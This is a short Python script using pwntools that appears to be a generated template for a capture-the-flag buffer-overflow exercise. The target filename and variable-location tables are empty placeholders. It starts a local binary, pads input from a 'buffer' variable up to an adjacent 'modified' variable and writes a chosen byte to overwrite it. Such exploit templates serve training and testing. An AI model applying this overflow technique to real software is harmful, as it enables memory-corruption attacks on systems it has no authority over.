from pwn import *

gen_filename = ""
gen_names = {}
gen_var_locations = {}

e = ELF(gen_filename)
p = e.process()
p.recvline()

buff = gen_names["buffer"]
mod = gen_names["modified"]

payload = b""
payload += (gen_var_locations[mod][-1] - gen_var_locations[buff][-1]) * b"a"
payload += b"z"
p.sendline(payload)

p.stream()
